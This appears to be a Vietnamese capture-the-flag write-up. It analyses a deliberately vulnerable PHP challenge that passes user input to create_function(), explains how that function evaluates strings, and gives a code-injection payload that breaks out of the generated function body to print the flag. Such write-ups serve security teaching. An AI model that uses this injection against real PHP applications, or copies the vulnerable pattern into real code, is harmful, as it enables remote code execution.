# Đoạn code xử lý logic
```PHP
<?php
ini_set('display_errors', 'on');
ini_set('error_reporting', E_ALL);

$success = '
<div class="alert alert-success alert-dismissible" role="alert">
    <button type="button" class="close" data-dismiss="alert" aria-label="Close"><span aria-hidden="true">&times;</span></button>
    Function declared.
</div>
';

include "flag.php";

if (isset ($_POST['c']) && !empty ($_POST['c'])) {
    $fun = create_function('$flag', $_POST['c']);
    print($success);
    //fun($flag);
    if (isset($_POST['q']) && $_POST['q'] == 'checked') {
        die();
    }
}
?>
```

# Phân tích luồng hoạt động
```PHP
if (isset ($_POST['c']) && !empty ($_POST['c'])) {
    $fun = create_function('$flag', $_POST['c']);
    print($success);
    //fun($flag);
    if (isset($_POST['q']) && $_POST['q'] == 'checked') {
        die();
    }
}
```  

Biến `$fun` được tạo 1 hàm thực thi thông qua hàm `create_function()`.  

# Analysis  
Trước hết ta phải hiểu hàm `create_function()` là gì và hoạt động như thế nào.  

`create_function()` là một hàm của PHP dùng để tạo một anonymous function (hàm ẩn danh) từ chuỗi string. Nó từng khá phổ biến trong PHP 4/5 nhưng đã bị deprecated ở PHP 7.2 và xóa hoàn toàn ở PHP 8.0 vì nhiều vấn đề bảo mật.

Cú pháp:
```PHP
create_function(string $args, string $code)
```
* $args: danh sách tham số của hàm
* $code: phần thân hàm (không cần viết {})

Ví dụ:
```PHP
$func = create_function('$a, $b', 'return $a + $b;');
echo $func(3, 5);
```

Kết quả: `8`  


Nó thực sự làm gì bên trong?  
Ví dụ:
```PHP
$f = create_function('$name', 'return "Hello ".$name;');
```
PHP sẽ tạo một hàm kiểu như:
```PHP
function lambda_1($name) {
    return "Hello ".$name;
}
```
và trả về tên hàm:  
```PHP
echo $f;
```
có thể ra:  
`lambda_1`  
Sau đó:
```PHP
$f("hacker");
```
thực chất là:  
```PHP
lambda_1("hacker");
```  

Tại sao nó nguy hiểm?
Vì code được truyền vào là string rồi được PHP eval().  
# Payload exploi

Ở bài này, tác giả đã comment mất đoạn code thực thi mã độc, nên việc chèn các payload như `echo $flag;` sẽ không hiệu quả  

Có 1 lỗ hổng gọi là Code Injection. Chúng ta sẽ cố chèn mã độc để phá vỡ logic của hàm create_function()  

Payload: `}; echo $flag; {`

Khi đó hàm create_function sẽ tạo ra một hàm kiểu như:
```PHP
function lambda_1($flag) {
    };
    echo $flag; 
    {
}
```  
